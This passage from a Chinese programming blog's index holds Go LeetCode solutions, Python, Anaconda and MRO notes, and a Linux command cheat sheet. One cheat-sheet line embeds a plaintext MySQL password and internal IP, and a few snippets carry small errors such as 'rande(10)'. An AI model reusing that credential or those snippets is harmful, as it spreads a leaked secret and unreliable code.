      <link href="/%E7%AE%97%E6%B3%95/2021-04-12-LeetCode-215-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-12-LeetCode-215-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p><p>示例 1:</p><p>输入: [3,2,1,5,6,4] 和 k &#x3D; 2<br>输出: 5<br>示例 2:</p><p>输入: [3,2,3,1,2,4,5,5,6] 和 k &#x3D; 4<br>输出: 4<br>说明:</p><p>你可以假设 k 总是有效的，且 1 ≤ k ≤ 数组的长度。</p><p><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array">https://leetcode-cn.com/problems/kth-largest-element-in-an-array</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>最小堆</li></ul><pre class="line-numbers language-none"><code class="language-none">type MinHeap struct &#123;    arr  []int    size int&#125;func (m *MinHeap) Len() int &#123;    return len(m.arr)&#125;func (m *MinHeap) Less(i, j int) bool &#123;    return m.arr[i] &lt; m.arr[j]&#125;func (m *MinHeap) Swap(i, j int) &#123;    m.arr[i], m.arr[j] &#x3D; m.arr[j], m.arr[i]&#125;func (m *MinHeap) Push(v interface&#123;&#125;) &#123;    m.arr &#x3D; append(m.arr, v.(int))&#125;func (m *MinHeap) Pop() interface&#123;&#125; &#123;    t :&#x3D; m.arr[m.Len()-1] &#x2F;&#x2F; 最后一个    m.arr &#x3D; m.arr[0 : m.Len()-1]    return t&#125;func (m *MinHeap) Top() int &#123;    return m.arr[0] &#x2F;&#x2F; 第一个&#125;func (m *MinHeap) RealPush(v int) &#123;    if m.size &#x3D;&#x3D; m.Len() &#123;        if m.Top() &lt; v &#123;            heap.Pop(m)            heap.Push(m, v)        &#125;    &#125; else &#123;        heap.Push(m, v)    &#125;&#125;func InitHeap(size int) MinHeap &#123;    m :&#x3D; MinHeap&#123;        arr:  make([]int, 0),        size: size,    &#125;    heap.Init(&amp;m)    return m&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-20-有效括号</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-11-LeetCode-20-%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-11-LeetCode-20-%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p><p>有效字符串需满足：</p><p>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。</p><p><a href="https://leetcode-cn.com/problems/valid-parentheses/">https://leetcode-cn.com/problems/valid-parentheses/</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>滑动窗口</li></ul><pre class="line-numbers language-none"><code class="language-none">type stack struct &#123;    arr []int32&#125;func (s *stack) push(c int32) &#123;    s.arr &#x3D; append(s.arr, c)&#125;func (s *stack) pop() int32 &#123;    var t int32    if !s.isEmpty() &#123;        t &#x3D; s.arr[len(s.arr)-1]        s.arr &#x3D; s.arr[:len(s.arr)-1]    &#125;    return t&#125;func (s *stack) isEmpty() bool &#123;    if len(s.arr) &#x3D;&#x3D; 0 &#123;        return true    &#125;    return false&#125;func isValid(s string) bool &#123;    m :&#x3D; map[int32]int32&#123;        &#39;)&#39;: &#39;(&#39;,        &#39;]&#39;: &#39;[&#39;,        &#39;&#125;&#39;: &#39;&#123;&#39;,    &#125;    sta :&#x3D; stack&#123;arr: make([]int32, 0, 0)&#125;    for _, v :&#x3D; range s &#123;        if mv, ok :&#x3D; m[v]; ok &#123;            if sta.pop() !&#x3D; mv &#123;                return false            &#125;        &#125; else &#123;            sta.push(v)        &#125;    &#125;    if sta.isEmpty() &#123;        return true    &#125;    return false&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch data</title>
      <link href="/uncatesgorized/2021-04-09-Elasticsearch-data/"/>
      <url>/uncatesgorized/2021-04-09-Elasticsearch-data/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">&#123;Id:443,Name:&quot;林黛玉&quot;,Description:&quot;可叹停机德，堪怜咏絮才。玉带林中挂，金簪雪里埋。&quot;,Age:15&#125;,&#123;Id:444,Name:&quot;薛宝钗&quot;,Description:&quot;可叹停机德，堪怜咏絮才。玉带林中挂，金簪雪里埋。&quot;,Age:17&#125;,&#123;Id:445,Name:&quot;贾元春&quot;,Description:&quot;二十年来辨是非，榴花开处照宫闱。三春争及初春景，虎兔相逢大梦归。&quot;,Age:45&#125;,&#123;Id:446,Name:&quot;贾探春&quot;,Description:&quot;才自精明志自高，生于末世运偏消。清明涕送江边望，千里东风一梦遥。&quot;,Age:19&#125;,&#123;Id:447,Name:&quot;贾迎春&quot;,Description:&quot;子系中山狼，得志便猖狂。金闺花柳质，一载赴黄粱。&quot;,Age:22&#125;,&#123;Id:448,Name:&quot;贾惜春&quot;,Description:&quot;勘破三春景不长，缁衣顿改昔年装。可怜绣户侯门女，独卧青灯古佛旁。&quot;,Age:13&#125;,&#123;Id:449,Name:&quot;史湘云&quot;,Description:&quot;富贵又何为，襁褓之间父母违。展眼吊斜晖，湘江水逝楚云飞。&quot;,Age:15&#125;,&#123;Id:450,Name:&quot;妙玉&quot;,Description:&quot;欲洁何曾洁，云空未必空。可怜金玉质，终陷淖泥中！&quot;,Age:18&#125;,&#123;Id:451,Name:&quot;王熙凤&quot;,Description:&quot;凡鸟偏从末世来，都知爱慕此生才。一从二令三人木，哭向金陵事更哀。&quot;,Age:35&#125;,&#123;Id:452,Name:&quot;巧姐&quot;,Description:&quot;势败休云贵，家亡莫论亲。偶因济刘氏，巧得遇恩人。&quot;,Age:9&#125;,&#123;Id:453,Name:&quot;李纨&quot;,Description:&quot;桃李春风结子完，到头谁似一盆兰。如冰水好空相妒，枉与他人作笑谈！&quot;,Age:36&#125;,&#123;Id:454,Name:&quot;秦可卿&quot;,Description:&quot;情天情海幻情身，情既相逢必主淫。漫言不肖皆荣出，造衅开端实在宁。&quot;,Age:35&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-随机函数</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.runoob.com/python/python-numbers.html">菜鸟教程</a></p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: UTF-8 -*-import randomprint random.randint(1,10)         # 产生 1 到 10 的一个整数型随机数  print random.choice(rande(10))   # 产生 0 到 9 的一个整数型随机数  print random.random()              # 产生 [0,1) 之间的随机浮点数print random.uniform(0,100)        # 产生  [0,100] 之间的随机浮点数，不是整数print random.choice(&#39;tomorrow&#39;)    # 从序列中随机选取一个元素print random.randrange(1,100,2)    # 生成从1到100的间隔为2的随机整数mylist &#x3D; list(&quot;hello,world!&quot;)      # 将序列a中的元素顺序打乱random.shuffle(mylist)print mylist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Windows多版本安装</title>
      <link href="/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Python-Windows%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
      <url>/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Python-Windows%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h4 id="可能的解决方案"><a href="#可能的解决方案" class="headerlink" title="可能的解决方案"></a>可能的解决方案</h4><ul><li>安装多个python版本，使用不同的命令进s行版本的区分<pre class="line-numbers language-none"><code class="language-none">C:\Users\hero\python2Python 2.7.X&gt;&gt;&gt;</li></ul><p>C:\Users\hero\python3<br>Python 3.X.X<br>&gt;&gt;&gt;</p><p>两个python版本都装了pip以后怎么办?<br>python安装路径找到Scripts文件夹，进入里面找到pip*-script.py，打开修改第一句为要指定的python解释器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>:hexoPostRenderEscape–&gt;</p><ul><li>virtualenv</li><li>anaconda(推荐)</li><li>…(如果有更好的方案再补充)</li></ul><h4 id="anaconda是什么？"><a href="#anaconda是什么？" class="headerlink" title="anaconda是什么？"></a>anaconda是什么？</h4><ul><li>Anaconda是开源的python发行版本，包含了大量科学包。主要是可以用来进行python的环境管理，也就是说利用Conda可以在同一台机器上进行不同版本python的切换</li></ul><h4 id="为什么用anaconda？"><a href="#为什么用anaconda？" class="headerlink" title="为什么用anaconda？"></a>为什么用anaconda？</h4><ul><li>希望自己的机器上同时拥有不同版本的python，以满足不同代码的需求。</li><li>Windows环境下使用virtualenv对Python进行多版本隔离，但是前提是能安装上多个版本。[笑哭.jpg]</li><li>Win8.1安装Python&#x3D;&#x3D;3.5&#x3D;&#x3D;以上提示缺失&#x3D;&#x3D;api-ms-win-crt-runtime-l1-1-0.dll&#x3D;&#x3D;问题</li></ul><h4 id="怎么安装anaconda？"><a href="#怎么安装anaconda？" class="headerlink" title="怎么安装anaconda？"></a>怎么安装anaconda？</h4><ul><li>国内镜像地址 : <blockquote><p><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">清华大学开源软件镜像站</a><br><a href="https://jingyan.baidu.com/article/3f16e0031e87522591c10320.html">如何安装Anaconda和Python</a></p></blockquote></li></ul><h4 id="安装anaconda过程"><a href="#安装anaconda过程" class="headerlink" title="安装anaconda过程"></a>安装anaconda过程</h4><ul><li>安装好anaconda之后会自带：base(root)<br>的python</li><li>安装其他版本的python<blockquote><ul><li>添加清华镜像(不然安装会超时)</li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;msys2&#x2F;conda config --set show_channel_urls yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="Conda命令"><a href="#Conda命令" class="headerlink" title="Conda命令"></a>Conda命令</h4><pre class="line-numbers language-none"><code class="language-none">conda create --name python27 python&#x3D;2.7 环境2.7名称python27conda create –name cpu 创建一个名为cpu的环境 source activate cpu 激活cpu环境 source deactivate 禁用当前环境 conda remove –name 环境名 –all conda search 软件名 &#x2F;&#x2F;可以查看到对应的不同版本 conda install 软件名 安装软件 conda list 查看已安装的package conda list -n 环境名 查看指定环境已安装的package conda install -n 环境名 软件名 指定环境名 安装软件 如果不用-n指定环境名称，则被安装在当前活跃环境 conda update -n 环境名 软件名 指定环境名更新软件 conda remove -n 环境名 软件名 删除指定环境的指定软件包 conda env list &#x2F;&#x2F;查看现有的环境<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-官网例子读懂MRO继承</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E5%AE%98%E7%BD%91%E4%BE%8B%E5%AD%90%E8%AF%BB%E6%87%82MRO%E7%BB%A7%E6%89%BF/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E5%AE%98%E7%BD%91%E4%BE%8B%E5%AD%90%E8%AF%BB%E6%87%82MRO%E7%BB%A7%E6%89%BF/</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/25321349">知乎详解（官网翻译）</a><br><a href="http://python.jobbole.com/85685/">MRO历史</a></p><h4 id="C3方法解析顺序-The-C3-Method-Resolution-Order"><a href="#C3方法解析顺序-The-C3-Method-Resolution-Order" class="headerlink" title="C3方法解析顺序(The C3 Method Resolution Order)"></a>C3方法解析顺序(The C3 Method Resolution Order)</h4><ul><li>像深度又像广度排序<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> O <span class="token operator">=</span> object<span class="token operator">>></span><span class="token operator">></span> class F<span class="token punctuation">(</span>O<span class="token punctuation">)</span>: pass<span class="token operator">>></span><span class="token operator">></span> class E<span class="token punctuation">(</span>O<span class="token punctuation">)</span>: pass<span class="token operator">>></span><span class="token operator">></span> class D<span class="token punctuation">(</span>O<span class="token punctuation">)</span>: pass<span class="token operator">>></span><span class="token operator">></span> class C<span class="token punctuation">(</span>D,F<span class="token punctuation">)</span>: pass<span class="token operator">>></span><span class="token operator">></span> class B<span class="token punctuation">(</span>D,E<span class="token punctuation">)</span>: pass<span class="token operator">>></span><span class="token operator">></span> class A<span class="token punctuation">(</span>B,C<span class="token punctuation">)</span>: pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;sh                          6Level 3                 | O |                  (more general)                      &#x2F;  ---  \                     &#x2F;    |    \                      |                    &#x2F;     |     \                     |                   &#x2F;      |      \                    |                  ---    ---    ---                   |Level 2        3 | D | 4| E |  | F | 5                |                  ---    ---    ---                   |                   \  \ _ &#x2F;       |                   |                    \    &#x2F; \ _    |                   |                     \  &#x2F;      \  |                   |                      ---      ---                    |Level 1            1 | B |    | C | 2                 |                      ---      ---                    |                        \      &#x2F;                      |                         \    &#x2F;                      \ &#x2F;                           ---Level 0                 0 | A |              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">L[A] &#x3D; A + merge(BDEO,CDFO,BC)   &#x3D; A + B + merge(DEO,CDFO,C)   &#x3D; A + B + C + merge(DEO,DFO)   &#x3D; A + B + C + D + merge(EO,FO)   &#x3D; A + B + C + D + E + merge(O,FO)   &#x3D; A + B + C + D + E + F + merge(O,O)   &#x3D; A B C D E F O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h5><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; O &#x3D; object&gt;&gt;&gt; class F(O): pass&gt;&gt;&gt; class E(O): pass&gt;&gt;&gt; class D(O): pass&gt;&gt;&gt; class C(D,F): pass&gt;&gt;&gt; class B(E,D): pass&gt;&gt;&gt; class A(B,C): pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id=""><a href="#" class="headerlink" title="."></a>.</h5>  <pre class="line-numbers language-none"><code class="language-none">                           6                          ---Level 3                  | O |                       &#x2F;  ---  \                      &#x2F;    |    \                     &#x2F;     |     \                    &#x2F;      |      \                  ---     ---    ---Level 2        2 | E | 4 | D |  | F | 5                  ---     ---    ---                   \      &#x2F; \     &#x2F;                    \    &#x2F;   \   &#x2F;                     \  &#x2F;     \ &#x2F;                      ---     ---Level 1            1 | B |   | C | 3                      ---     ---                       \       &#x2F;                        \     &#x2F;                          ---Level 0                0 | A |                          ---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; A.mro()(&lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.E&#39;&gt;,&lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.F&#39;&gt;,&lt;type &#39;object&#39;&gt;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="什么时候对MRO来说是非法的？"><a href="#什么时候对MRO来说是非法的？" class="headerlink" title="什么时候对MRO来说是非法的？"></a>什么时候对MRO来说是非法的？</h4><p>- </p><h5 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h5>  <pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; O &#x3D; object&gt;&gt;&gt; class X(O): pass&gt;&gt;&gt; class Y(O): pass&gt;&gt;&gt; class A(X,Y): pass&gt;&gt;&gt; class B(Y,X): pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-none"><code class="language-none"> -----------|           ||    O      ||  &#x2F;   \    | - X    Y  &#x2F;   |  &#x2F; | &#x2F;   | &#x2F;  |&#x2F;   A    B   \   &#x2F;     ?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-none"><code class="language-none">L[O] &#x3D; 0L[X] &#x3D; X OL[Y] &#x3D; Y OL[A] &#x3D; A X Y OL[B] &#x3D; B Y X O<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-none"><code class="language-none">L[C] &#x3D; C + merge(AXYO, BYXO, AB)     &#x3D; C + A + merge(XYO, BYXO, B)     &#x3D; C + A + B + merge(XYO, YXO)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>这时，我们不能合并列表XYO和列表YXO，：因此，没有了符合规则的head，C3算法停止。在这种情形下，Python 2.3会抛出一个异常(TypeError: MRO conflict among bases Y, X)，因为X在YXO的tail中,而Y在XYO的tail中,阻止创建模棱两可的继承层次。Python 2.2不会抛出异常，而是选择了一种特定的方法解析顺序(CABXYO).</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂-整数的二进制中有几个1</title>
      <link href="/uncatesgorized/2021-03-07-%E6%9D%82-%E6%95%B4%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD%E6%9C%89%E5%87%A0%E4%B8%AA1/"/>
      <url>/uncatesgorized/2021-03-07-%E6%9D%82-%E6%95%B4%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD%E6%9C%89%E5%87%A0%E4%B8%AA1/</url>
      
        <content type="html"><![CDATA[<h3 id="x-x-1-消除x最后一位的1"><a href="#x-x-1-消除x最后一位的1" class="headerlink" title="x &amp; (x - 1) 消除x最后一位的1"></a>x &amp; (x - 1) 消除x最后一位的1</h3><pre class="line-numbers language-none"><code class="language-none">x &#x3D; 15    15 &#x3D; 0b1111    14 &#x3D; 0b1110y &#x3D; x &amp; (x-1)y &#x3D; 0b1110  # 消去了x最后一位的1y &#x3D; 14    14 &#x3D; 0b1110    13 &#x3D; 0b1101z &#x3D; y &amp; (y-1)z &#x3D; 0b1100  # 消去了y最后一位的1……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>O(1) 时间检测X是否是2的n次方<blockquote><p>一个数如果是2的n次方，则这个数的二进制中只有一个1<br>如果消去最后一位的1，则这个数为0</p></blockquote><pre class="line-numbers language-none"><code class="language-none">x &#x3D; 16  16 &#x3D; 0b10000  15 &#x3D; 0b01111x &amp; (x - 1) &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>一个整数的二进制中有多少个1<blockquote><p>x &amp; (x - 1) 可以消除最后一位的1<br>while循环消除最后一位的1，直到结果为0</p></blockquote><pre class="line-numbers language-none"><code class="language-none">a &#x3D; 15b &#x3D; 0while a &gt; 0:  a &#x3D; a &amp; (a - 1)  b +&#x3D; 1print b # 1的个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-常用命令整理</title>
      <link href="/uncatesgorized/2021-03-07-Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
      <url>/uncatesgorized/2021-03-07-Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="开进程并发下载"><a href="#开进程并发下载" class="headerlink" title="开进程并发下载"></a>开进程并发下载</h4><pre class="line-numbers language-none"><code class="language-none">for ((s&#x3D;1987;s&lt;2019;s&#x3D;s+1))dofor ((m&#x3D;1;m&lt;13;m&#x3D;m+1))doaa&#x3D;($s&#39;_&#39;$m)echo $aawget https:&#x2F;&#x2F;transtats.bts.gov&#x2F;PREZIP&#x2F;On_Time_Reporting_Carrier_On_Time_Performance_1987_present_$aa.zip &amp;donedone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="远程复制"><a href="#远程复制" class="headerlink" title="远程复制"></a>远程复制</h4><pre class="line-numbers language-none"><code class="language-none">从前面的文件夹复制到后面的文件夹scp -r remote_username@remote_ip:remote_folder local_folder<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="查看外网ip"><a href="#查看外网ip" class="headerlink" title="查看外网ip"></a>查看外网ip</h4><pre class="line-numbers language-none"><code class="language-none">curl -L tool.lu&#x2F;ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看文件大小"><a href="#查看文件大小" class="headerlink" title="查看文件大小"></a>查看文件大小</h4><pre class="line-numbers language-none"><code class="language-none">du -h --max-depth&#x3D;0 .&#x2F;2017_credits.txt由小到大du -sh * | sort -n由大到小du -sh * | sort -nr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查看ip"><a href="#查看ip" class="headerlink" title="查看ip"></a>查看ip</h4><pre class="line-numbers language-none"><code class="language-none">ip addr show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="看日志"><a href="#看日志" class="headerlink" title="看日志"></a>看日志</h4><pre class="line-numbers language-none"><code class="language-none">看线上日志要用less&#x2F;more，千万别用vi，vi会一次把文件全读入，内存耗光<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="远程文件弄到本地文件夹"><a href="#远程文件弄到本地文件夹" class="headerlink" title="远程文件弄到本地文件夹"></a>远程文件弄到本地文件夹</h4><pre class="line-numbers language-none"><code class="language-none">shutil.copy(remote_file, local_file_dir)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="echo导出select数据"><a href="#echo导出select数据" class="headerlink" title="echo导出select数据"></a>echo导出select数据</h4><pre class="line-numbers language-none"><code class="language-none">echo &quot;select * from miveshow_money.user_credits_history limit 1&quot; | mysql -umiveshow -h10.0.110.115 -pmiveshow123 -Dmiveshow &gt; o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="统计文件和文件夹的总量"><a href="#统计文件和文件夹的总量" class="headerlink" title="统计文件和文件夹的总量"></a>统计文件和文件夹的总量</h4><pre class="line-numbers language-none"><code class="language-none">ls | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="统计文件个数"><a href="#统计文件个数" class="headerlink" title="统计文件个数"></a>统计文件个数</h4><pre class="line-numbers language-none"><code class="language-none">ls -l |grep &quot;^-&quot;|wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="统计当前目录下的所有目录"><a href="#统计当前目录下的所有目录" class="headerlink" title="统计当前目录下的所有目录"></a>统计当前目录下的所有目录</h4><pre class="line-numbers language-none"><code class="language-none">文件以-开头目录以d开头1、ls -l | grep &quot;^d&quot;目录以&#x2F;结尾2、ls -F | grep &quot;&#x2F;$&quot;配合查看文件数量的命令查看目录数量ls -l | grep &quot;^d&quot; | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="排序、去重"><a href="#排序、去重" class="headerlink" title="排序、去重"></a>排序、去重</h4><pre class="line-numbers language-none"><code class="language-none">sort -n test.txt | uniq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="grep多个关键字-or"><a href="#grep多个关键字-or" class="headerlink" title="grep多个关键字(or)"></a>grep多个关键字(or)</h4><pre class="line-numbers language-none"><code class="language-none">grep file.txt -E &quot;aaa|bbb|ccc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除多行"><a href="#删除多行" class="headerlink" title="删除多行"></a>删除多行</h4><p>删除多行，闭区间[1,999]</p><pre class="line-numbers language-none"><code class="language-none">vi file.txt:1,999d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="覆盖方式生成文件"><a href="#覆盖方式生成文件" class="headerlink" title="覆盖方式生成文件"></a>覆盖方式生成文件</h4><pre class="line-numbers language-none"><code class="language-none">cat file.log | grep test &gt; result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="生成或追加到文件"><a href="#生成或追加到文件" class="headerlink" title="生成或追加到文件"></a>生成或追加到文件</h4><pre class="line-numbers language-none"><code class="language-none">cat file.log | grep test &gt;&gt; result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-vim基本操作命令</title>
      <link href="/uncatesgorized/2021-03-07-Linux-vim%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/uncatesgorized/2021-03-07-Linux-vim%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
      
